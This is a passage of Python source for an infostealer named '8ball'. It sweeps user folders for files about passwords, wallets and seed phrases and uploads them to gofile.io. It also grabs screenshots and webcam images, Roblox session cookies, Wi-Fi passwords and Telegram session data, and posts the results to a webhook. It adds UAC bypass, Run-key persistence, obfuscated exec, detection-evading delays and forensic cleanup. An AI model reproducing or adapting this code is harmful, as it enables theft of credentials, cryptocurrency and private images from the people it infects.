        thread.join(60)
    # Now start wallet/gaming (after passwords) — wallets sent first
    THr34D1157.clear()
    S74r77Hr34D(G47H3rZ1P5,    [br0W53rP47H5, p47H570Z1P, t3136r4M]                 )
    for thread in THr34D1157:
        thread.join(60)
    RX_DB6("[8Ball] G47H3r411 orchestrator completed.")
    
def G37F11353rv3r():
    try:
        resp = loads(urlopen("https://api.gofile.io/servers").read().decode('utf-8'))
        return resp["data"]["servers"][0]["name"]
    except:
        return "store1"

def UP104D7060F113(path):
    errors = []
    if isinstance(path, list):
        errors = path
        return errors
    try:
        server = G37F11353rv3r()
        with open(path, "rb") as f:
            r = requests.post(
                f"https://{server}.gofile.io/contents/uploadfile",
                files={"file": f},
                timeout=120,
                verify=False
            )
        r.raise_for_status()
        data = r.json()
        if data.get("status") == "ok":
            dl = data.get("data", {}).get("downloadPage") or data.get("data", {}).get("directLink", "")
            if dl:
                return dl
            errors.append("GoFile: missing downloadPage in response")
        else:
            errors.append(f"GoFile: status={data.get('status')}")
    except Exception as e:
        errors.append(f"GoFile requests failed: {type(e).__name__}: {e}")
    for fb_server in ["store1", "store2", "store3"]:
        try:
            with open(path, "rb") as f:
                r = requests.post(
                    f"https://{fb_server}.gofile.io/contents/uploadfile",
                    files={"file": f},
                    timeout=60,
                    verify=False
                )
            r.raise_for_status()
            data = r.json()
            if data.get("status") == "ok":
                dl = data.get("data", {}).get("downloadPage", "")
                if dl:
                    return dl
        except Exception as e:
            errors.append(f"GoFile fallback {fb_server}: {type(e).__name__}: {e}")
    return errors

K1W1F113s = []
def K1W1F113(path, keywords):
    global K1W1F113s
    fifound = []
    try:
        for root, dirs, files in os.walk(path):
            for file in files:
                lower_name = file.lower()
                if not any(worf in lower_name for worf in keywords):
                    continue
                fullpath = os.path.join(root, file)
                if os.path.isfile(fullpath) and os.stat(fullpath).st_size < 5000000 and not fullpath.lower().endswith(".lnk"):
                    fifound.append(fullpath)
                    if len(fifound) >= 2000:
                        break
            if len(fifound) >= 2000:
                break
    except OSError:
        return
    K1W1F113s.append(["folder", path, fifound])

def K1W1():
    if not FEATURE_CONFIG.get("file_search", False):
        return []
    user_profile = os.path.expanduser("~")
    K1W1F113s.clear()
    path2search = [
        os.path.join(user_profile, "Desktop"),
        os.path.join(user_profile, "Downloads"),
        os.path.join(user_profile, "Documents"),
        os.path.join(user_profile, "Pictures"),
        os.path.join(user_profile, "Videos"),
        os.path.join(roaming, "Microsoft", "Windows", "Recent"),
    ]
    key_wordsFiles = [
        "passw", "login", "secret", "wallet", "crypto", "discord", "token",
        "backup", "seed", "mnemonic", "private", "key", "telegram", "config",
    ]
    wikith = []
    for patt in path2search:
        if not os.path.exists(patt) or not os.path.isdir(patt):
            continue
        kiwi = threading.Thread(target=K1W1F113, args=[patt, key_wordsFiles])
        kiwi.start()
        wikith.append(kiwi)
    return wikith

RX_DB6("[8Ball] Initializing GLINFO...")
GLINFO = G108411NF0()

DETECTED = False
w411375 = [
    ["nkbihfbeogaeaoehlefnkodbefgpgknn", "Metamask"],
    ["bfnaelmomeimhlpmgjnjophhpkkoljpa", "Phantom"],
    ["fhbohimaelbohpjbbldcngcnapndodjp", "Binance"],
]
k3YW0rd = [
    '[coinbase](https://coinbase.com)',
    '[gmail](https://gmail.com)',
    '[discord](https://discord.com)',
    '[paypal](https://paypal.com)',
    '[binance](https://binance.com)',
    '[github](https://github.com)',
]

def filestealr():
    if not FEATURE_CONFIG.get("file_search", False):
        return
    wikith = K1W1()
    if not wikith:
        return
    for thread in wikith:
        thread.join()
    time.sleep(0.5)
    all_files = []
    for arg in K1W1F113s:
        for ffil in arg[2]:
            all_files.append(ffil)
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    if not all_files:
        data = {
            "content": f"@everyone @here {GLINFO}",
            "embeds": [{"title": "8ball", "description": "Local Files feature ran but found no matching files."}],
            "username": "8ball",
            "allowed_mentions": {"parse": ["everyone", "roles", "users"]},
        }
        L04DUr118(h00k, data=dumps(data).encode(), headers=headers)
        return
    zip_link = None
    try:
        _zip_name = f"RX_LocalFiles_{random.randint(1000,9999)}.zip"
        zip_path = os.path.join(temp or os.getenv("TEMP") or ".", _zip_name)
        with ZipFile(zip_path, 'w') as zipf:
            for file_path in all_files:
                if os.path.isfile(file_path):
                    try:
                        zipf.write(file_path, arcname=os.path.relpath(file_path, os.path.expanduser("~")))
                    except Exception:
                        zipf.write(file_path, arcname=os.path.basename(file_path))
        for _attempt in range(3):
            zip_link = UP104D7060F113(zip_path)
            if isinstance(zip_link, str) and zip_link.startswith("http"):
                break
            time.sleep(4)
        for _r in range(5):
            try: os.remove(zip_path); break
            except PermissionError: time.sleep(0.5)
            except Exception: break
    except Exception as e:
        RX_DB6(f"[8Ball] filestealr zip creation failed: {e}", "ERROR")
        zip_link = None
    desc = f"Found {len(all_files)} files"
    if isinstance(zip_link, str) and zip_link.startswith("http"):
        desc += f"\n\n[Download ZIP]({zip_link})"
    elif isinstance(zip_link, list):
        desc += f"\n\nUpload errors: {'; '.join(str(x) for x in zip_link[:3])}"
    data = {
        "content": f"@everyone @here {GLINFO}",
        "embeds": [{"title": "8ball", "description": desc}],
        "username": "8ball",
        "allowed_mentions": {"parse": ["everyone", "roles", "users"]},
    }
    L04DUr118(h00k, data=dumps(data).encode(), headers=headers)



# === ENHANCED STEALTH LAYER ===
# Runtime encryption, code obfuscation, timing jitter, process isolation, anti-indicators
import hashlib as _hl

def c2_encrypt(plaintext, key=None):
    """Encrypt data with AES-256-GCM for C2 transmission"""
    if key is None:
        key = _hl.sha256(b"8ball_C2_v2_2024").digest()
    if isinstance(plaintext, str):
        plaintext = plaintext.encode()
    cipher = AES.new(key, AES.MODE_GCM)
    ct, tag = cipher.encrypt_and_digest(plaintext)
    return base64.b64encode(cipher.nonce + tag + ct).decode()

def c2_decrypt(data_b64, key=None):
    """Decrypt AES-256-GCM C2 data"""
    if key is None:
        key = _hl.sha256(b"8ball_C2_v2_2024").digest()
    raw = base64.b64decode(data_b64)
    nonce, tag, ct = raw[:12], raw[12:28], raw[28:]
    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
    return cipher.decrypt_and_verify(ct, tag)

def obfuscate_payload(code_str):
    """Obfuscate Python code with XOR + base64 for runtime exec"""
    encoded = code_str.encode() if isinstance(code_str, str) else code_str
    k = random.randint(1, 254)
    return base64.b64encode(bytes([k]) + bytes(b ^ k for b in encoded)).decode()

def exec_obfuscated(b64_payload):
    """Deobfuscate and exec code at runtime"""
    try:
        raw = base64.b64decode(b64_payload)
        k, xored = raw[0], raw[1:]
        exec(bytes(b ^ k for b in xored).decode())
    except Exception:
        pass

def random_delay(min_s=0.5, max_s=3.0):
    """Random sleep to evade behavioral detection"""
    time.sleep(random.uniform(min_s, max_s))

def shuffled_run(callables):
    """Execute callables in random order with delays and per-function timeout"""
    idx = list(range(len(callables)))
    random.shuffle(idx)
    for i in idx:
        t = threading.Thread(target=callables[i], daemon=True)
        t.start()
        t.join(90)
        random_delay(0.3, 1.5)

def spawn_isolated(target_name, args_repr="()"):
    """Spawn a function in a separate process for isolation"""
    try:
        subprocess.Popen(
            [sys.executable, "-c",
             f"import sys; sys.path={repr(sys.path)}; exec(open({repr(sys.argv[0] if getattr(sys,'frozen',False) else __file__)}).read()); {target_name}(*{args_repr})"],
            creationflags=CREATE_NO_WINDOW,
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
    except Exception:
        pass

def rand_temp_file(ext=""):
    """Generate random temp filename to avoid indicator patterns"""
    return os.path.join(
        os.environ.get("TEMP", "."),
        "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=12)) + ext
    )

def startup_persistence_func():
    if not FEATURE_CONFIG.get("startup_persistence", False):
        return
    RX_DB6("[8Ball] startup_persistence_func: installing persistence")
    try:
        if getattr(sys, 'frozen', False):
            payload = sys.argv[0]
        else:
            payload = f'"{sys.executable}" "{__file__}"'
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path) as key:
            winreg.SetValueEx(key, "8ball", 0, winreg.REG_SZ, payload)
        RX_DB6("[8Ball] persistence installed via HKCU Run key")
    except Exception as e:
        RX_DB6(f"[8Ball] persistence failed: {e}", "ERROR")

def cleanup_indicators():
    """Remove common forensic indicators (logs, registry artifacts)"""
    try:
        for p in [os.path.join(os.environ.get("TEMP", ""), "8ball_debug.log")]:
            if os.path.isfile(p):
                try: os.remove(p)
                except: pass
    except: pass

# ── system_info ──
def system_info_collect():
    if not FEATURE_CONFIG.get("system_info", False):
        return
    RX_DB6("[8Ball] system_info_collect: starting")
    try:
        import platform
        try:
            import psutil
        except ImportError:
            RX_DB6("[8Ball] system_info_collect: psutil not installed, attempting install", "WARN")
            try:
                subprocess.run(f'"{executable}" -m pip install psutil --quiet', shell=True, creationflags=CREATE_NO_WINDOW)
                time.sleep(3)
                import psutil
            except Exception:
                RX_DB6("[8Ball] system_info_collect: psutil install failed, using fallback", "ERROR")
                uname = platform.uname()
                info = (
                    f"**OS**: {uname.system} {uname.release} {uname.version}\n"
                    f"**Host**: {uname.node}\n"
                    f"**CPU**: {uname.processor}\n"
                    f"**Machine**: {uname.machine}\n"
                )
                headers = {
                    "Content-Type": "application/json",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
                }
                data = {
                    "content": f"@everyone @here {GLINFO}",
                    "embeds": [{"title": "8ball — System Info", "description": info, "footer": {"text": "8ball"}}],
                    "username": "8ball",
                    "allowed_mentions": {"parse": ["everyone", "roles", "users"]}
                }
                L04DUr118(h00k, data=dumps(data).encode(), headers=headers)
                RX_DB6("[8Ball] System info embed sent (fallback).")
                return
        uname = platform.uname()
        boot = _dt.datetime.fromtimestamp(psutil.boot_time()).strftime("%Y-%m-%d %H:%M:%S")
        cpu = f"{psutil.cpu_count(logical=True)} logical / {psutil.cpu_count(logical=False)} physical"
        mem = f"{psutil.virtual_memory().total // (1024**3)} GB"
        info = (
            f"**OS**: {uname.system} {uname.release} {uname.version}\n"
            f"**Host**: {uname.node}\n"
            f"**CPU**: {cpu}\n"
            f"**RAM**: {mem}\n"
            f"**Boot**: {boot}\n"
        )
        headers = {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
        }
        data = {
            "content": f"@everyone @here {GLINFO}",
            "embeds": [{"title": "8ball — System Info", "description": info, "footer": {"text": "8ball"}}],
            "username": "8ball",
            "allowed_mentions": {"parse": ["everyone", "roles", "users"]}
        }
        L04DUr118(h00k, data=dumps(data).encode(), headers=headers)
        RX_DB6("[8Ball] System info embed sent.")
    except Exception as e:
        RX_DB6(f"[8Ball] system_info_collect failed: {type(e).__name__}: {e}", "ERROR")

# ── screenshot_capture ──
def screenshot_capture_func():
    if not FEATURE_CONFIG.get("screenshot_capture", False):
        return
    RX_DB6("[8Ball] screenshot_capture_func: starting")
    try:
        import io
        try:
            import PIL.ImageGrab
        except ImportError:
            RX_DB6("[8Ball] screenshot_capture_func: PIL not installed, attempting install", "WARN")
            try:
                subprocess.run(f'"{executable}" -m pip install Pillow --quiet', shell=True, creationflags=CREATE_NO_WINDOW)
                time.sleep(3)
                import PIL.ImageGrab
            except Exception:
                RX_DB6("[8Ball] screenshot_capture_func: Pillow install failed", "ERROR")
                return
        img = PIL.ImageGrab.grab()
        buf = io.BytesIO()
        img.save(buf, format="PNG")
        path = rand_temp_file(".png")
        with open(path, "wb") as f:
            f.write(buf.getvalue())
        link = UP104D7060F113(path)
        try: os.remove(path)
        except: pass
        if not isinstance(link, str) or not link.startswith("http"):
            link = "Upload failed"
        desc = f"Screenshot captured.\n[Download]({link})"
        headers = {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
        }
        data = {
            "content": f"@everyone @here {GLINFO}",
            "embeds": [{"title": "8ball — Screenshot", "description": desc, "footer": {"text": "8ball"}}],
            "username": "8ball",
            "allowed_mentions": {"parse": ["everyone", "roles", "users"]}
        }
        L04DUr118(h00k, data=dumps(data).encode(), headers=headers)
        RX_DB6("[8Ball] Screenshot embed sent.")
    except Exception as e:
        RX_DB6(f"[8Ball] screenshot_capture_func failed: {type(e).__name__}: {e}", "ERROR")

# ── webcam_capture ──
def webcam_capture_func():
    if not FEATURE_CONFIG.get("webcam_capture", False):
        return
    RX_DB6("[8Ball] webcam_capture_func: starting")
    try:
        import cv2
        cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)
        if not cap.isOpened():
            RX_DB6("[8Ball] Webcam: no camera found", "WARN")
            return
        ret, frame = cap.read()
        cap.release()
        if not ret:
            RX_DB6("[8Ball] Webcam: failed to read frame", "WARN")
            return
        path = rand_temp_file(".png")
        cv2.imwrite(path, frame)
        link = UP104D7060F113(path)
        try: os.remove(path)
        except: pass
        if not isinstance(link, str) or not link.startswith("http"):
            link = "Upload failed"
        desc = f"Webcam capture.\n[Download]({link})"
        headers = {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
        }
        data = {
            "content": f"@everyone @here {GLINFO}",
            "embeds": [{"title": "8ball — Webcam", "description": desc, "footer": {"text": "8ball"}}],
            "username": "8ball",
            "allowed_mentions": {"parse": ["everyone", "roles", "users"]}
        }
        L04DUr118(h00k, data=dumps(data).encode(), headers=headers)
        RX_DB6("[8Ball] Webcam embed sent.")
    except Exception as e:
        RX_DB6(f"[8Ball] webcam_capture_func failed: {type(e).__name__}: {e}", "ERROR")

# ── roblox_cookies ──
def _read_dir_copied(src):
    """Copy dir to temp then return temp path, or None if src missing."""
    if not os.path.isdir(src):
        return None
    tmp = tempfile.mktemp(suffix="_rbx")
    try:
        shutil.copytree(src, tmp, ignore_dangling_symlinks=True)
        return tmp
    except Exception:
        try: shutil.rmtree(tmp, ignore_errors=True)
        except: pass
        return None

def _search_leveldb_for_cookies(leveldb_path, found):
    """Search .ldb/.log files in leveldb_path for .ROBLOSECURITY tokens."""
    for fname in os.listdir(leveldb_path):
        if not (fname.endswith(".ldb") or fname.endswith(".log")):
            continue
        try:
            raw = open(os.path.join(leveldb_path, fname), errors="ignore").read()
        except:
            continue
        for m in re.findall(r"\_\|WARNING:-DO NOT SHARE THIS\.--([a-zA-Z0-9_\-]+)", raw):
            if m not in found:
                found.append(m)
        for m in re.findall(r"\.ROBLOSECURITY[^a-zA-Z0-9_\-]+([a-zA-Z0-9_\-]{20,})", raw):
            if m not in found:
                found.append(m)

def _search_browser_cookies_for_roblox(found):
    """Search Chrome/Edge sqlite cookie DBs for .ROBLOSECURITY."""
    browser_profiles = [
        os.path.join(os.environ.get("LOCALAPPDATA", ""), "Google", "Chrome", "User Data"),
        os.path.join(os.environ.get("LOCALAPPDATA", ""), "Google", "Chrome SxS", "User Data"),
        os.path.join(os.environ.get("LOCALAPPDATA", ""), "Microsoft", "Edge", "User Data"),
        os.path.join(os.environ.get("LOCALAPPDATA", ""), "BraveSoftware", "Brave-Browser", "User Data"),
        os.path.join(os.environ.get("APPDATA", ""), "Opera Software", "Opera Stable"),
        os.path.join(os.environ.get("APPDATA", ""), "Opera Software", "Opera GX Stable"),
    ]
    for profile_root in browser_profiles:
        if not os.path.isdir(profile_root):
            continue
        for root, dirs, files in os.walk(profile_root):
            if "Cookies" in files:
                db_path = os.path.join(root, "Cookies")
                if not os.path.isfile(db_path):
                    continue
                tmp_db = tempfile.mktemp(suffix="_rbx_cookies")
                try:
                    shutil.copy2(db_path, tmp_db)
                except:
                    continue
                try:
                    conn = sqlite3.connect(tmp_db)
                    cur = conn.cursor()
                    for row in cur.execute("SELECT host_key, name, path, encrypted_value FROM cookies WHERE host_key LIKE '%roblox%' AND name = '.ROBLOSECURITY'"):
                        if row[3] and row[3] not in (b"", b"\x00"):
                            found.append(row[3].hex()[:64])
                    conn.close()
                except:
                    pass
                try: os.remove(tmp_db)
                except: pass

def roblox_cookies_func():
    if not FEATURE_CONFIG.get("roblox_cookies", False):
        return
    RX_DB6("[8Ball] roblox_cookies_func: starting")
    try:
        cookies = []
        roaming = os.environ.get("APPDATA", "")
        local = os.environ.get("LOCALAPPDATA", "")
        paths = [
            os.path.join(local, "Roblox", "LocalStorage", "leveldb"),
            os.path.join(roaming, "Roblox", "LocalStorage", "leveldb"),
            os.path.join(local, "Roblox Corporation", "Roblox", "LocalStorage", "leveldb"),
        ]
        for p in paths:
            tmp_p = _read_dir_copied(p)
            if tmp_p:
                _search_leveldb_for_cookies(tmp_p, cookies)
                try: shutil.rmtree(tmp_p, ignore_errors=True)
                except: pass
        if not cookies:
            create_windows_user()
            try:
                _search_browser_cookies_for_roblox(cookies)
            finally:
                remove_windows_user()
        if cookies:
            desc = "Found Roblox `.ROBLOSECURITY` tokens:\n"
            for c in cookies:
                desc += f"`{c[:64]}...`\n"
            if len(desc) > 4000:
                desc = desc[:3997] + "..."
        else:
            desc = "No Roblox `.ROBLOSECURITY` tokens found."
        headers = {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
        }
        data = {
            "content": f"@everyone @here {GLINFO}",
            "embeds": [{"title": "8ball — Roblox Cookies", "description": desc, "footer": {"text": "8ball"}}],
            "username": "8ball",
            "allowed_mentions": {"parse": ["everyone", "roles", "users"]}
        }
        L04DUr118(h00k, data=dumps(data).encode(), headers=headers)
        if cookies:
            RX_DB6(f"[8Ball] Roblox cookies embed sent ({len(cookies)} found).")
        else:
            RX_DB6("[8Ball] Roblox cookies embed sent (none found).")
    except Exception as e:
        RX_DB6(f"[8Ball] roblox_cookies_func failed: {type(e).__name__}: {e}", "ERROR")

# ── wifi_passwords ──
def _wifi_key_via_xml(profile):
    """Fallback: export profile XML and extract keyMaterial."""
    tmp_dir = tempfile.mktemp(suffix="_wifi")
    try:
        os.makedirs(tmp_dir, exist_ok=True)
        subprocess.run(
            ["netsh", "wlan", "export", "profile", profile, f"folder={tmp_dir}"],
            capture_output=True, text=True, creationflags=CREATE_NO_WINDOW
        )
        for fname in os.listdir(tmp_dir):
            if fname.endswith(".xml"):
                xml_path = os.path.join(tmp_dir, fname)
                raw = open(xml_path, "r", encoding="utf-8").read()
                km = re.search(r"<keyMaterial>(.*?)</keyMaterial>", raw)
                if km:
                    return km.group(1).strip()
    except:
        pass
    finally:
        try: shutil.rmtree(tmp_dir, ignore_errors=True)
        except: pass
    return ""

def wifi_passwords_func():
    if not FEATURE_CONFIG.get("wifi_passwords", False):
        return
    RX_DB6("[8Ball] wifi_passwords_func: starting")
    try:
        result = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output=True, text=True, creationflags=CREATE_NO_WINDOW)
        lines = []
        for line in result.stdout.splitlines():
            m = re.search(r":\s*(.+)$", line)
            if m:
                profile = m.group(1).strip()
                r2 = subprocess.run(["netsh", "wlan", "show", "profile", profile, "key=clear"], capture_output=True, text=True, creationflags=CREATE_NO_WINDOW)
                pw = ""
                for l2 in r2.stdout.splitlines():
                    pm = re.search(r"Key Content\s*:\s*(.+)", l2)
                    if pm:
                        pw = pm.group(1).strip()
                if not pw:
                    pw = _wifi_key_via_xml(profile)
                lines.append(f"SSID: {profile} | Password: {pw}")
        if not lines:
            RX_DB6("[8Ball] WiFi: no profiles found", "WARN")
            return
        text = "\n".join(lines)
        path = rand_temp_file(".txt")
        with open(path, "w", encoding="utf-8") as f:
            f.write(text)
        link = UP104D7060F113(path)
        try: os.remove(path)
        except: pass
        if not isinstance(link, str) or not link.startswith("http"):
            link = "Upload failed"
        desc = f"**{len(lines)}** Wi-Fi profiles extracted.\n[Download]({link})"
        headers = {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
        }
        data = {
            "content": f"@everyone @here {GLINFO}",
            "embeds": [{"title": "8ball — Wi-Fi Passwords", "description": desc, "footer": {"text": "8ball"}}],
            "username": "8ball",
            "allowed_mentions": {"parse": ["everyone", "roles", "users"]}
        }
        L04DUr118(h00k, data=dumps(data).encode(), headers=headers)
        RX_DB6(f"[8Ball] WiFi passwords embed sent ({len(lines)} profiles).")
    except Exception as e:
        RX_DB6(f"[8Ball] wifi_passwords_func failed: {type(e).__name__}: {e}", "ERROR")

# ── telegram_desktop ──
def telegram_desktop_func():
    if not FEATURE_CONFIG.get("telegram_desktop", False):
        return
    RX_DB6("[8Ball] telegram_desktop_func: starting")
    try:
        tdata = os.path.join(os.environ.get("APPDATA", ""), "Telegram Desktop", "tdata")
        if not os.path.isdir(tdata):
            RX_DB6("[8Ball] Telegram: tdata not found", "WARN")
            return
        zip_path = Z1PF01D3r("Telegram", tdata)
        if not zip_path or not os.path.isfile(zip_path):
            RX_DB6("[8Ball] Telegram: zip failed", "WARN")
            return
        link = ""
        for i in range(3):
            link = UP104D7060F113(zip_path)
            if "https://" in str(link):
                break
            time.sleep(4)
        try: os.remove(zip_path)
        except: pass
        if not isinstance(link, str) or not link.startswith("http"):
            link = "Upload failed"
        desc = f"Telegram Desktop `tdata` folder.\n[Download]({link})"
        headers = {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
        }
        data = {
            "content": f"@everyone @here {GLINFO}",
            "embeds": [{"title": "8ball — Telegram Desktop", "description": desc, "footer": {"text": "8ball"}}],
            "username": "8ball",
            "allowed_mentions": {"parse": ["everyone", "roles", "users"]}
        }
        L04DUr118(h00k, data=dumps(data).encode(), headers=headers)
        RX_DB6("[8Ball] Telegram Desktop embed sent.")
    except Exception as e:
        RX_DB6(f"[8Ball] telegram_desktop_func failed: {type(e).__name__}: {e}", "ERROR")

# Encrypt sensitive in-memory strings at rest
def secure_store(key_name, value):
    """Encrypt a config value and store in FEATURE_CONFIG"""
    try:
        FEATURE_CONFIG[key_name] = c2_encrypt(value)
    except Exception:
        pass

def secure_retrieve(key_name):
    """Decrypt a config value from FEATURE_CONFIG"""
    try:
        return c2_decrypt(FEATURE_CONFIG.get(key_name, ""))
    except Exception:
        return ""

# Elevate to admin via UAC bypass before any feature runs
_uac_bypass()
random_delay(0.5, 2.0)

# Startup persistence (install before any stealers run, after elevation)
startup_persistence_func()

# Execute stealers with randomized order and jitter to evade detection
shuffled_run([
    filestealr,
    G47H3r411,
    system_info_collect,
    screenshot_capture_func,
    webcam_capture_func,
    roblox_cookies_func,
    wifi_passwords_func,
    telegram_desktop_func,
])

random_delay(0.5, 1.5)
cleanup_indicators()
send_debug_embed()
